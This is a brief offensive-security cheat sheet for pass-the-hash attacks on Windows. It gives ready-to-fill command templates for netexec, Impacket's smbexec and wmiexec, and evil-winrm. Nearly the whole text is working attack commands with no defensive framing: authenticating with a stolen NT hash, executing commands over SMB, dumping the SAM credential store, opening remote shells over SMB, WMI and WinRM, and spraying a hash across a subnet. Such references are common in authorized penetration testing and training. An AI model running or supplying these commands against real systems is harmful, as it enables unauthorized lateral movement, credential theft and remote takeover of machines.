PASS-THE-HASH (PtH) - QUICK REF

Hash format needed:  <LM>:<NT>   (pass only the NT half after the colon)

SMB access check:
    nxc smb <target-ip> -u <user> -H <NT-hash>
SMB command exec:
    nxc smb <target-ip> -u <user> -H <NT-hash> -x "<cmd>"
SAM dump (needs local admin):
    nxc smb <target-ip> -u <user> -H <NT-hash> --sam

Shell via SMB:
    nxc smb <target-ip> -u <user> -H <NT-hash> -x "<cmd>"
    smbexec.py  <domain>/<user>@<target-ip> -hashes :<NT-hash>   (no binary)
    wmiexec.py  <domain>/<user>@<target-ip> -hashes :<NT-hash>   (WMI, quieter)
    [local acct] use ./<user> instead of <domain>/<user>

WinRM shell (port 5985):
    evil-winrm -i <target-ip> -u <user> -H <NT-hash>

Spray across subnet:
    nxc smb <subnet>/<cidr> -u <user> -H <NT-hash> --local-auth
